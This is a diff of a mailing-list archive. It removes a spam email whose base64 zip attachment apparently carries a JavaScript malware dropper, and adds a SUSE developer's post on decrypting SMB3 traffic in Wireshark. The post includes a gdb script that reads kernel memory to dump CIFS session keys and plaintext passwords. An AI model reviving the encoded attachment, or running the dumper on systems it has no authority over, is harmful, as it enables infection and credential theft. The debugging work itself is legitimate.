@@ -1,65 +1,245 @@
-From: <counselling-30L6jp03H7UtpYsHHOQ6Llpr/1R2p/CL@public.gmane.org>
-Subject: (unknown)
-Date: Sat, 20 May 2017 17:45:19 -0000
-Message-ID: <149530231977.31455.11700773813584251426@ttknet.ru>
+From: aaptel-IBi9RG/b67k@public.gmane.org (=?utf-8?Q?Aur=C3=A9lien?= Aptel)
+Subject: wireshark decryption
+Date: Wed, 24 May 2017 16:02:24 +0200
+Message-ID: <mpsvaoqtksv.fsf@aaptelpc.suse.de>
 Mime-Version: 1.0
-Content-Type: application/zip; name="9301738364993.zip"
-Content-Transfer-Encoding: base64
-To: <linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Content-Type: multipart/mixed; boundary="=-=-="
+To: linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, ronniesahlberg-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org
 Return-path: <linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-Subject: 
-Content-Disposition: attachment
 Sender: linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-ID: <linux-cifs.vger.kernel.org>
 
-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
+--=-=-=
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+Hi,
+
+I've sent a couple of changes to Wireshark to add a table in the the
+SMB2 protocol preference to add Session ID =3D> (secret) Session Key
+mappings so that Wireshark can derive the decryption keys and decrypt
+the traffic.
+
+The way wireshark prefs works allows you to pass them via the command
+line e.g.:
+
+% ./tshark -o 'uat:custom_smb2_seskey_list:"3d00009400480000","28f2847263c8=
+3dc00621f742dd3f2e7b"' -r ~/prog/smbcrypto/filt.pcap=20
+...SMB2 172 Negotiate Protocol Request
+...SMB2 318 Negotiate Protocol Response
+...SMB2 190 Session Setup Request, NTLMSSP_NEGOTIATE
+...SMB2 318 Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED,=
+ NTLMSSP_CHALLENGE
+...SMB2 430 Session Setup Request, NTLMSSP_AUTH, User: SUSE\administrator
+...SMB2 142 Session Setup Response
+...SMB2 180 Tree Connect Request Tree: \\WS2016\encrypted
+...SMB2 150 Tree Connect Response
+...SMB2 268 Decrypted SMB3;Ioctl Request FSCTL_VALIDATE_NEGOTIATE_INFO
+...SMB2 258 Decrypted SMB3;Ioctl Response FSCTL_VALIDATE_NEGOTIATE_INFO
+...SMB2 250 Decrypted SMB3;Create Request File:
+....
+
+Otherwise you can add them manually in
+Edit > Preferences > Protocols > SMB2.
+
+The change can be found here [1], any help in getting it reviewed/merged
+welcome.
+
+The session key is computed by the client, it's different than the
+"session key" generated in SMB1 ([2]) which is sent on the wire and not
+safe to use for anything cryptographic. I suspect the dissector was
+already trying to use this one but it's most likely wrong.
+
+As for obtaining the session key, I came up with 2 solutions:
+- Make the kernel dump them. I will send a patch soon
+  after this email on linux-cifs that adds a CIFS_DEBUG_DUMP_KEYS config
+  option that simply dumps the keys on the console.
+- Dump them by reading kernel memory. This can be done with gdb and
+  /proc/kcore. I've attached a hackish gdb script to do that.
+
+Fist solution is more robust and does not require any tool but it's a
+bit dangerous to include code that simply dumps sensitive data like
+this. I've made it clear in the config name and description that it is
+not safe to enable this for anything other than debugging.
+
+Second solution simply needs root access and gdb but structure offsets
+are hardcoded in the script. If the kernel debug info package is
+installed on the system gdb can lookup structure offsets and so the
+script doesn't need to hardcode the offsets... but it's quite large
+(around a GB on my system).
+
+gdb -q /boot/vmlinux-4.4.62-18.6-default /proc/kcore      \
+    -ex "source ~aaptel/prog/gdb-linux/cifs_dump_keys.py" \
+    -ex 'cifs-dump'
+=20=20=20=20
+Reading symbols from /boot/vmlinux-4.4.62-18.6-default...
+done.
+
+[New process 1]
+Core was generated by `BOOT_IMAGE=3D/boot/vmlinuz-4.4.62-18.6-default root=
+=3DUUID=3D74a87444-aac1-4b24-a6d1-'.
+#0  0x0000000000000000 in irq_stack_union ()
+[*] trying to get cifs symbols from kallsyms...
+[*] OK! cifs-dump command defined
+host <10.160.66.43> vers <1.0> dom <SLES11SP4> user <aaptel> pw <xxxxxxxxx>
+SID <64 00 00 00 00 00 00 00>
+SESKEY <00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>
+
+host <10.160.65.202> vers <2.0> dom <SUSE> user <administrator> pw <xxxxxxx=
+xxxx>
+SID <25 00 00 44 00 50 00 00>
+SESKEY <00 00 00 00 80 ce ed fb 02 88 ff ff 80 76 1c 57>
+
+(gdb) q
+
+1: https://code.wireshark.org/review/#/q/topic:smb2-decryption-uat
+2: https://msdn.microsoft.com/en-us/library/ff470134.aspx
+
+Cheers,
+
+--=20
+Aur=C3=A9lien Aptel / SUSE Labs Samba Team
+GPG: 1839 CB5F 9F5B FB9B AA97  8C99 03C8 A49B 521B D5D3
+SUSE Linux GmbH, Maxfeldstra=C3=9Fe 5, 90409 N=C3=BCrnberg, Germany
+GF: Felix Imend=C3=B6rffer, Jane Smithard, Graham Norton, HRB 21284 (AG N=
+=C3=BCrnberg)
+
+--=-=-=
+Content-Type: text/x-python
+Content-Disposition: attachment; filename=cifs_dump_keys.py
+
+# gdb python script to dump cifs.ko related structure
+#
+# Usage:
+# gdb -q /boot/vmlinux-4.4.62-18.6-default /proc/kcore -ex "source path/to/this.py" -ex "cifs-dump"
+#
+# Copyright (c) Aurelien Aptel <aaptel-IBi9RG/b67k@public.gmane.org>, 2017
+#
+# This work is licensed under the terms of the GNU GPL version 3.
+#
+
+import gdb
+import subprocess
+
+def sizeof(t):
+    return int(gdb.execute("p sizeof(%s)"%t, to_string=True).split("=")[1].strip())
+
+#
+# offset of members in various kernel structures
+#
+OFF = {
+    'list_head': {'next': 0, 'prev': sizeof("void*")},
+    'TCP_Server_Info': {
+        'tcp_ses_list': 0, 'smb_ses_list': 2*sizeof("void*"),
+        'hostname': 0x50, 'vals': 0x40
+    },
+    'smb_version_values': {'version_string':0},
+    'cifs_ses': {
+        'Suid': 0x78, 'auth_key': 0xf8, 'user_name':0xe0,
+        'domainName':0xe8, 'password':0xf0
+    },
+    'session_key': {'response': sizeof("unsigned int")},
+}
+
+CIFS_TCP_SES_LIST_ADDR = 0
+
+def add_module_syms(mod):
+    kofile = subprocess.check_output(['modinfo', '-n', mod]).strip()
+    moddir = "/sys/module/%s/sections/" % mod
+
+    def sec_addr(sec, pre=True):
+        if pre:
+            return "-s "+sec+" "+open(moddir+sec).read().strip()
+        return open(moddir+sec).read().strip()
+
+
+    cmd = " ".join(["add-symbol-file", kofile, sec_addr(".text", False),
+                sec_addr(".data"), sec_addr(".bss")])
+    gdb.execute(cmd)
+
+def kallsyms_get_sym(sym):
+    r = subprocess.check_output(["grep", sym, "/proc/kallsyms"])
+    return int(r.split()[0], 16)
+
+def to_byte(x):
+    if isinstance(x, str):
+        return ord(x[0])
+    return x[0]
+
+def hexdump(p, length):
+    b=gdb.selected_inferior().read_memory(p, length)
+    return ' '.join(['%02x'%to_byte(x) for x in b])
+
+def ptr_to_int(p):
+    if isinstance(p, gdb.Value):
+        s = str(p).split()[0]
+        if '0x' in s:
+            p = int(s, 16)
+        else:
+            p = int(s, 10)
+    return p
+
+def deref(p, to_string=False):
+    p = ptr_to_int(p)
+    if to_string:
+        return gdb.parse_and_eval("*((char**)(0x%x))"%p).string()
+    else:
+        return ptr_to_int(gdb.parse_and_eval("*((void**)(0x%x))"%p))
+
+#
+# linked list iterator
+#
+def iter_raw(base, list_off, member_off):
+    base = ptr_to_int(base)
+    p = deref(base + OFF['list_head']['next'])
+    while p != base:
+        yield p - list_off + member_off
+        p = deref(p + OFF['list_head']['next'])
+
+class CIFSDump(gdb.Command):
+    """Iterate over smb session and dump keys"""
+
+    def __init__(self):
+        super(CIFSDump, self).__init__("cifs-dump", gdb.COMMAND_DATA,
+                                          gdb.COMPLETE_EXPRESSION)
+
+    def invoke(self, arg, from_tty):
+        argv = gdb.string_to_argv(arg)
+        for tcp in iter_raw(CIFS_TCP_SES_LIST_ADDR,
+                            OFF['TCP_Server_Info']['tcp_ses_list'], 0):
+
+            host = deref(tcp+OFF['TCP_Server_Info']['hostname'], to_string=True)
+            vers = deref(deref(tcp+OFF['TCP_Server_Info']['vals'])
+                         +OFF['smb_version_values']['version_string'], to_string=True)
+            for ses in iter_raw(tcp+OFF['TCP_Server_Info']['smb_ses_list'], 0, 0):
+                gdb.write("host <%s> vers <%s> dom <%s> user <%s> pw <%s>\nSID <%s>\nSESKEY <%s>\n\n"%(
+                    host,
+                    vers,
+                    deref(ses+OFF['cifs_ses']['domainName'], to_string=True),
+                    deref(ses+OFF['cifs_ses']['user_name'], to_string=True),
+                    deref(ses+OFF['cifs_ses']['password'], to_string=True),
+                    hexdump(ses+OFF['cifs_ses']['Suid'], 8),
+                    hexdump(ses+OFF['cifs_ses']['auth_key']+OFF['session_key']['response'], 16),
+                ))
+
+try:
+    gdb.write("[*] trying to get cifs module symbols...\n")
+    add_module_syms("cifs")
+    CIFS_TCP_SES_LIST_ADDR = ptr_to_int(gdb.parse_and_eval("cifs_tcp_ses_list").address)
+except Exception:
+    gdb.write("[*] failed\n")
+
+if CIFS_TCP_SES_LIST_ADDR == 0:
+    try:
+        gdb.write("[*] trying to get cifs symbols from kallsyms...\n")
+        CIFS_TCP_SES_LIST_ADDR = kallsyms_get_sym("cifs_tcp_ses_list")
+    except Exception:
+        gdb.write("[*] failed\n")
+
+if CIFS_TCP_SES_LIST_ADDR == 0:
+    gdb.write("[*] cannot find addr for cifs_tcp_ses_list :(\n")
+else:
+    CIFSDump()
+    gdb.write("[*] OK! cifs-dump command defined\n")
+
+--=-=-=--
